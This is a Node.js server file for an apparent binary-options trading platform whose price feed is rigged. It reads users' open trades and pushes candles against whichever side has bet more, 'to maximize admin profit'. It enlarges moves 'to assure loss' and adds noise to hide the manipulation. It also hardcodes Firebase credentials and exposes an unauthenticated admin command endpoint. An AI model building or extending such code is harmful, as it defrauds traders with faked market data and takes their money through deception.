// --- START: server.js (v23 - Natural Market Movement + Admin Control) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
app.use(express.json());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const MAX_CANDLES = 1000;
const TIMEFRAME = 60000;
const TICK_MS = 300;
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 300;

const markets = {}; 
const adminPatterns = {}; 
const marketSettings = {}; // Stores admin settings per market
const activeTradesDb = {}; // Stores live user trades mapped by marketId

// Helper functions
function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// --- Admin Control Listener ---
db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach(marketId => {
        if (fbMarkets[marketId]?.pattern_config?.isActive) {
            adminPatterns[marketId] = fbMarkets[marketId].pattern_config;
        } else {
            delete adminPatterns[marketId]; 
        }
        // Capture active trades for Smart Algorithmic Control
        activeTradesDb[marketId] = fbMarkets[marketId]?.activeTrades || {};
        marketSettings[marketId] = fbMarkets[marketId]?.settings || { smartMode: true, winRatio: 0.70 };
    });
});

// 1. Normal Candle Generation (Natural & Random)
function generateHistoricalCandle(timestamp, open, isLive = false) {
    const safeOpen = Math.max(MIN_PRICE, open);

    // Generate realistic body and wicks
    const isGreen = Math.random() > 0.5;
    const rand = Math.random();
    let bodyFactor;
    
    if (rand < 0.15) bodyFactor = 0.00002; // Doji / small
    else if (rand < 0.4) bodyFactor = 0.00008; // Medium-small
    else if (rand < 0.8) bodyFactor = 0.00018; // Normal
    else bodyFactor = 0.00035; // Big body

    const body = bodyFactor * safeOpen;
    const close = isGreen ? safeOpen + body : safeOpen - body;
    const upperWick = (Math.random() * 0.00018) * safeOpen;
    const lowerWick = (Math.random() * 0.00018) * safeOpen;

    const high = Math.max(safeOpen, close) + upperWick;
    const low = Math.min(safeOpen, close) - lowerWick;

    if (isLive) {
        // If live, we start at open and set targets to let the tick engine build it.
        return {
            timestamp,
            open: roundPrice(safeOpen),
            high: roundPrice(safeOpen),
            low: roundPrice(safeOpen),
            close: roundPrice(safeOpen),
            targetHigh: roundPrice(high),
            targetLow: roundPrice(low),
            targetClose: roundPrice(close),
            isPredetermined: true, // Tell tick engine to follow targets smoothly
            isNatural: true // Flag to identify it's not overriding user trades deliberately by admin
        };
    }

    // Historical fast generation
    return {
        timestamp,
        open: roundPrice(safeOpen),
        high: roundPrice(high),
        low: roundPrice(low),
        close: roundPrice(close)
    };
}

// 2. Admin-Controlled Dynamic Candle Generation (Targeted Shape)
function generateDynamicCandle(timestamp, open, command) {
    let bodySize, upperWick, lowerWick, close, high, low;
    
    const stdBody = open * (0.0001 + Math.random() * 0.0001);
    const stdWick = open * (Math.random() * 0.00008);

    switch (command) {
        case 'GREEN':
            bodySize = stdBody; close = open + bodySize; upperWick = stdWick; lowerWick = stdWick; break;
        case 'RED':
            bodySize = stdBody; close = open - bodySize; upperWick = stdWick; lowerWick = stdWick; break;
        case 'BULLISH_MARUBOZU':
            bodySize = open * (0.00025 + Math.random() * 0.0001); close = open + bodySize; upperWick = 0; lowerWick = 0; break;
        case 'BEARISH_MARUBOZU':
            bodySize = open * (0.00025 + Math.random() * 0.0001); close = open - bodySize; upperWick = 0; lowerWick = 0; break;
        case 'GREEN_HAMMER':
            bodySize = open * (0.00005 + Math.random() * 0.00005); close = open + bodySize; upperWick = open * (Math.random() * 0.00002); lowerWick = bodySize * (2 + Math.random() * 1.5); break;
        case 'RED_HAMMER':
            bodySize = open * (0.00005 + Math.random() * 0.00005); close = open - bodySize; upperWick = open * (Math.random() * 0.00002); lowerWick = bodySize * (2 + Math.random() * 1.5); break;
        case 'GREEN_SHOOTING_STAR':
            bodySize = open * (0.00005 + Math.random() * 0.00005); close = open + bodySize; upperWick = bodySize * (2 + Math.random() * 1.5); lowerWick = open * (Math.random() * 0.00002); break;
        case 'RED_SHOOTING_STAR':
            bodySize = open * (0.00005 + Math.random() * 0.00005); close = open - bodySize; upperWick = bodySize * (2 + Math.random() * 1.5); lowerWick = open * (Math.random() * 0.00002); break;
        case 'DOJI':
            bodySize = open * (Math.random() * 0.00001); close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = open * (0.00005 + Math.random() * 0.0001); lowerWick = open * (0.00005 + Math.random() * 0.0001); break;
        case 'LONG_LEGGED_DOJI':
            bodySize = open * (Math.random() * 0.00001); close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = open * (0.00015 + Math.random() * 0.0002); lowerWick = open * (0.00015 + Math.random() * 0.0002); break;
        case 'DRAGONFLY_DOJI':
            bodySize = open * (Math.random() * 0.00001); close = open + bodySize; upperWick = 0; lowerWick = open * (0.00015 + Math.random() * 0.0002); break;
        case 'GRAVESTONE_DOJI':
            bodySize = open * (Math.random() * 0.00001); close = open - bodySize; upperWick = open * (0.00015 + Math.random() * 0.0002); lowerWick = 0; break;
        case 'GREEN_SPINNING_TOP':
            bodySize = open * (0.00002 + Math.random() * 0.00003); close = open + bodySize; upperWick = bodySize * 2; lowerWick = bodySize * 2; break;
        case 'RED_SPINNING_TOP':
            bodySize = open * (0.00002 + Math.random() * 0.00003); close = open - bodySize; upperWick = bodySize * 2; lowerWick = bodySize * 2; break;
        case 'HUGE_PUMP':
            bodySize = open * (0.0004 + Math.random() * 0.0002); close = open + bodySize; upperWick = stdWick; lowerWick = stdWick; break;
        case 'HUGE_DUMP':
            bodySize = open * (0.0004 + Math.random() * 0.0002); close = open - bodySize; upperWick = stdWick; lowerWick = stdWick; break;
        default: 
            close = command === 'RED' ? open - stdBody : open + stdBody; upperWick = stdWick; lowerWick = stdWick;
    }
    
    high = Math.max(open, close) + upperWick;
    low = Math.min(open, close) - lowerWick;

    return {
        timestamp,
        open: roundPrice(open),
        high: roundPrice(open), 
        low: roundPrice(open), 
        close: roundPrice(open), 
        isPredetermined: true, // <-- This tells the server to strictly follow the target
        targetHigh: roundPrice(high),
        targetLow: roundPrice(low),
        targetClose: roundPrice(close),
        pattern: command
    };
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15;

    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const c = generateHistoricalCandle(nowPeriod - (i * TIMEFRAME), currentPrice, false);
        candles.push(c);
        currentPrice = c.close;
    }

    markets[marketId] = {
        marketId,
        marketPath: path,
        history: candles,
        currentPrice: currentPrice,
        lastMove: 0
    };
}

// Check for admin command before creating a new candle
function ensureCurrentPeriodCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    if (!lastCandle) return null;

    if (currentPeriod > lastCandle.timestamp) {
        let newCandle;
        
        if (marketData.nextCandleCommand) {
            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand);
            console.log(`[ADMIN] Market: ${marketData.marketId}, Time: ${new Date(currentPeriod).toLocaleTimeString()}, Command: ${marketData.nextCandleCommand}`);
            marketData.nextCandleCommand = null; // Clear command
        } 
        else {
            const adminPattern = adminPatterns[marketData.marketId];
            if (adminPattern && currentPeriod >= adminPattern.startTime) {
                const patternIndex = Math.floor((currentPeriod - adminPattern.startTime) / TIMEFRAME);
                if (patternIndex >= 0 && patternIndex < adminPattern.pattern.length) {
                    const adminColor = adminPattern.pattern[patternIndex];
                    newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, adminColor);
                }
            }
        }
        
        // If no admin command, create a normal, natural candle, OR a Smart Candle!
        if (!newCandle) {
            const settings = marketSettings[marketData.marketId] || { smartMode: true, winRatio: 0.70 };
            const trades = activeTradesDb[marketData.marketId] || {};
            let upVolume = 0, downVolume = 0;
            
            Object.values(trades).forEach(t => {
                if (t.direction === 'UP') upVolume += t.amount;
                if (t.direction === 'DOWN') downVolume += t.amount;
            });

            // Smart Auto-Pilot: If there is an imbalance, decide the candle direction to maximize admin profit
            if (settings.smartMode !== false && (upVolume > 0 || downVolume > 0)) {
                let targetDirection = null;
                // If more users bet UP, admin wants RED candle. If DOWN, admin wants GREEN candle.
                if (upVolume > downVolume) targetDirection = 'RED';
                else if (downVolume > upVolume) targetDirection = 'GREEN';
                
                if (targetDirection && Math.random() < (settings.winRatio || 0.70)) {
                    newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
                    // Add some noise to the target so it doesn't look totally robotic
                    newCandle.targetClose += (Math.random() - 0.5) * lastCandle.close * 0.0001;
                    console.log(`[SMART SYSTEM] Market ${marketData.marketId} Auto-Correcting to ${targetDirection} | UP: $${upVolume}, DOWN: $${downVolume}`);
                }
            }
            
            // If smart system didn't intervene, default to historical natural candle
            if (!newCandle) {
                newCandle = generateHistoricalCandle(currentPeriod, lastCandle.close, true);
            }
        }

        // Apply additional momentum to the smart target if there's extreme volume
        if (newCandle && newCandle.isPredetermined && !newCandle.isNatural) {
            const trades = activeTradesDb[marketData.marketId] || {};
            let upVolume = 0, downVolume = 0;
            Object.values(trades).forEach(t => {
                if (t.direction === 'UP') upVolume += t.amount;
                if (t.direction === 'DOWN') downVolume += t.amount;
            });
            const ratio = Math.max(upVolume, downVolume) / (Math.min(upVolume, downVolume) || 1);
            if (ratio > 5) {
                // If the volume imbalance is insane (>5x), make the candle even bigger to assure loss
                const boost = (newCandle.targetClose - newCandle.open) * 1.5;
                newCandle.targetClose = newCandle.open + boost;
            }
        }

        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        return newCandle;
    }
    return lastCandle;
}

// Tick Movement Controller
function updateRealisticPrice(marketData, candle, currentPeriod) {
    const now = Date.now();
    const timeElapsed = Math.max(0, now - currentPeriod);

    if (candle.isPredetermined) {
        // --- GUIDED MOVEMENT (Natural & Admin target) ---
        const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);
        
        // Add realistic non-linear path based on progress
        const easeProgress = Math.pow(progress, 0.8);
        const idealPrice = candle.open + (candle.targetClose - candle.open) * easeProgress;
        
        // Calculate noise
        const openPrice = candle.open;
        const baseVolatility = openPrice * 0.00004;
        const noiseFactor = 1 - (progress * 0.8); // Noise decreases slowly towards the end
        const randomNoise = (Math.random() - 0.5) * baseVolatility * 3 * noiseFactor;
        
        // Smart Continuous Intervention
        let smartImpulse = 0;
        const settings = marketSettings[marketData.marketId] || { smartMode: true, winRatio: 0.70 };
        const trades = activeTradesDb[marketData.marketId] || {};
        let upVol = 0, downVol = 0, activeCount = 0;

        Object.values(trades).forEach(t => {
            if (t.timestamp && now > t.timestamp + 600000) return; 
            if (t.direction === 'UP') upVol += t.amount;
            if (t.direction === 'DOWN') downVol += t.amount;
            activeCount++;
        });

        if (settings.smartMode !== false && activeCount > 0) {
            if (upVol > downVol && Math.random() < (settings.winRatio || 0.70)) {
                smartImpulse -= (baseVolatility * 2.0); // Pull down
            } else if (downVol > upVol && Math.random() < (settings.winRatio || 0.70)) {
                smartImpulse += (baseVolatility * 2.0); // Pull up
            }
        }

        marketData.currentPrice = idealPrice + randomNoise + smartImpulse;
        marketData.currentPrice = Math.min(marketData.currentPrice, candle.targetHigh);
        marketData.currentPrice = Math.max(marketData.currentPrice, candle.targetLow);

        // Lock exactly on target in the final moments to assure result
        if (timeElapsed >= TIMEFRAME - 500) {
            marketData.currentPrice = candle.targetClose;
        }
    }

    candle.close = roundPrice(marketData.currentPrice);
    candle.high = roundPrice(Math.max(candle.high, candle.close, candle.open));
    candle.low = roundPrice(Math.min(candle.low, candle.close, candle.open));
}

function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

// Market listener
db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach((marketId) => {
        const type = fbMarkets[marketId]?.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    const historyPayload = { type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) };
                    ws.send(JSON.stringify(historyPayload));
                }
            }
        } catch (_) {}
    });
});

app.get('/api/history/:marketId', (req, res) => {
    const marketId = req.params.marketId;
    if (markets[marketId] && markets[marketId].history) {
        res.json(markets[marketId].history);
    } else {
        res.status(404).json({ error: 'Market not found or not initialized' });
    }
});

// Admin Command Endpoint
app.post('/api/admin/command', (req, res) => {
    const { marketId, command } = req.body;
    if (!marketId || !command) {
        return res.status(400).json({ error: 'Missing marketId or command' });
    }
    if (markets[marketId]) {
        markets[marketId].nextCandleCommand = command;
        res.json({ success: true, message: `Command ${command} received for ${marketId}` });
    } else {
        res.status(404).json({ error: 'Market not found' });
    }
});

// Main Loop
let lastSyncMinute = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
    const currentMinute = Math.floor(now / 60000);

    for (const marketId in markets) {
        const marketData = markets[marketId];
        let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
        if (!candle) continue;

        updateRealisticPrice(marketData, candle, currentPeriod); 
        broadcastCandle(marketId, candle);
    }

    if (currentMinute > lastSyncMinute) {
        lastSyncMinute = currentMinute;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            const lastC = m.history[m.history.length-1];
            if (lastC) {
                batchUpdates[`markets/${m.marketPath}/live`] = {
                    price: lastC.close,
                    timestamp: lastC.timestamp
                };
            }
        }
        db.ref().update(batchUpdates).catch(()=>{});
        console.log(`[Batch Sync] ${Object.keys(markets).length} markets backed up.`);
    }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('UltraSmooth V23 - Natural & Admin Active'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));

// --- END OF FILE ---
